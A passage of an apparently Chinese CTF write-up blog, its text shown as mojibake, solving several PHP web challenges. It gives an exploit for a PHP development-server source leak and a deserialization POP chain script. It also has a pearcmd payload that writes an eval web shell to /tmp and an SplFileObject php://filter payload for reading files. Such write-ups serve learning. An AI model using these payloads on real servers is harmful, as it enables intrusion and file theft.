src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001660449-14587bf3-10c9-476f-a1e9-22d501efdc52.png" alt="image.png"><br>è®¿é—®æ ¹ç›®å½•<code>/</code>å‡ºç°ä»¥ä¸‹æƒ…å†µï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001606854-f0128886-182c-4eb5-9172-6c0387e9e027.png" alt="image.png"><br>è¿™é‡Œä¸º PHP Development Server å¯åŠ¨çš„æœåŠ¡ã€‚ç„¶åå°±å‡ºç°äº†æœ¬é¢˜çš„è€ƒç‚¹ï¼š</p><h3 id="PHP-lt-7-4-21-Development-Serveræºç æ³„éœ²æ¼æ´"><a href="#PHP-lt-7-4-21-Development-Serveræºç æ³„éœ²æ¼æ´" class="headerlink" title="PHP&lt;=7.4.21 Development Serveræºç æ³„éœ²æ¼æ´"></a>PHP&lt;=7.4.21 Development Serveræºç æ³„éœ²æ¼æ´</h3><blockquote><p><a href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a><br><a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p></blockquote><p>æˆ‘æœ€å¼€å§‹åœ¨bpä¸­æ‰‹åŠ¨è¾“å…¥é‚£ä¸ª\r\nä½†æ˜¯å‘ç°ä¸è¡Œï¼Œç»è¿‡å°è¯•æ‰çŸ¥é“éœ€è¦å…ˆå…³é—­<code>Updates COntentLength</code>å¹¶ä¸”æ‰“å¼€<code>hide nonâ€”printable chars</code>ï¼Œè¿™ä¸¤ä¸ªåˆ†åˆ«åœ¨ä»¥ä¸‹ä½ç½®ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002498712-172f96c6-35b8-4f31-b5f9-d17c822dc312.png" alt="image.png"><br>å’Œ<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002518945-25f2f952-9851-4f47-ba31-d199acf26ce3.png" alt="image.png"><br>åˆ†åˆ«æ‰“å¼€ä¹‹åï¼ŒæŒ‰ç…§ä»¥ä¸‹æ ¼å¼å‘é€å³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002554239-5388e99a-8075-4082-a0a1-3b696ffb131b.png" alt="image.png"><br>ä¹‹åå°±èƒ½å¤Ÿè·å¾—åˆ°puzzle.phpçš„å†…å®¹ã€‚å…¶ä¸­è€ƒå¯Ÿçš„æ˜¯phpçš„ååºåˆ—åŒ–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sdpc</span> = [<span class="string">&quot;welcome&quot;</span> =&gt; <span class="string">&quot;yeah, something hidden.&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;sdpc[<span class="string">&quot;welcome&quot;</span>]; <span class="comment">//å¯¹å¤§å®¶è¡¨ç¤ºæ¬¢è¿</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b ? <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">sdpc</span>(<span class="string">&#x27;welcom&#x27;</span>) : <span class="string">&#x27;welcome!&#x27;</span>.<span class="variable language_">$this</span>-&gt;c; <span class="comment">//å˜ç€æ³•æ¬¢è¿å¤§å®¶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/fl4g&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sdpc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sdpc&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sdpc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sdpc = <span class="keyword">array</span>(<span class="string">&quot;sdpc&quot;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Evil</span>(),<span class="string">&#x27;getflag&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span>[<span class="variable">$arguments</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;sdpc[<span class="string">&quot;welcome&quot;</span>]; <span class="comment">//å¯¹å¤§å®¶è¡¨ç¤ºæ¬¢è¿</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b ? <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">sdpc</span>(<span class="string">&#x27;welcom&#x27;</span>) : <span class="string">&#x27;welcome!&#x27;</span> . <span class="variable language_">$this</span>-&gt;c; <span class="comment">//è®¾ç½® b ï¼Œè§¦å‘ ___call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/fl4g&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ca</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$cb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cc</span>-&gt;b = <span class="string">&#x27;sp4c1ous&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cc</span>));</span><br></pre></td></tr></table></figure><p>ç”¨postä¼ å…¥ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678003313844-de470c08-436b-496a-b1f6-193a5bd1252e.png" alt="image.png"></p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><blockquote><p><a href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p></blockquote><p>pearcmdçš„åˆ©ç”¨ï¼Œä½†æ˜¯å¹¶ä¸ä¼šã€‚å…ˆæŠŠå®˜æ–¹wpç²˜åœ¨è¿™é‡Œå§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;sdpc=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004112573-9e6a567b-86ce-4314-b98e-99214b391728.png" alt="output.png"></p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><blockquote><p><a href="https://www.anquanke.com/post/id/284901">https://www.anquanke.com/post/id/284901</a></p></blockquote><p>å°±åšå‡ºæ¥äº†è¿™ä¸€ä¸ªï¼Œè¿˜æ˜¯æŠ„çš„ã€‚ã€‚ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677900359894-8183856c-3d9a-409b-9d34-eea5aff2dcb3.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$g</span>(<span class="variable">$t</span>);</span><br></pre></td></tr></table></figure><p>æ ¹æ®å›¾ç‰‡ï¼Œç›´æ¥ä¼ å…¥payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?g=<span class="built_in">SplFileObject</span>&amp;t=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><meta name="referrer" content="no-referrer" />]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
